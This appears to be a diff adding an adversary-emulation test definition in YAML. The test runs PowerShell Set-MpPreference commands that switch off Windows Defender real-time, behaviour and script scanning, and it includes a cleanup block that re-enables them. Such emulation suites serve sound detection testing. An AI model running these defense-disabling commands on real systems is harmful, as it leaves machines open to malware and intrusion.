@@ -1,0 +1,22 @@
+- id: 62e452f8-6af9-532f-ada7-d5c10a0a2dcb
+  name: Soumaia ART Tests - Tamper with Windows Defender ATP PowerShell
+  description: 'Attempting to disable scheduled scanning and other parts of windows defender atp. Upon execution Virus and Threat Protection will show as disabled
+
+    in Windows settings. (requires elevation)'
+  tactic: defense-impairment
+  technique:
+    attack_id: T1685
+    name: Disable or Modify Tools
+  platforms:
+    windows:
+      psh:
+        command: |-
+          Set-MpPreference -DisableRealtimeMonitoring 1
+          Set-MpPreference -DisableBehaviorMonitoring 1
+          Set-MpPreference -DisableScriptScanning 1
+          Set-MpPreference -DisableBlockAtFirstSeen 1
+        cleanup: |-
+          Set-MpPreference -DisableRealtimeMonitoring 0
+          Set-MpPreference -DisableBehaviorMonitoring 0
+          Set-MpPreference -DisableScriptScanning 0
+          Set-MpPreference -DisableBlockAtFirstSeen 0
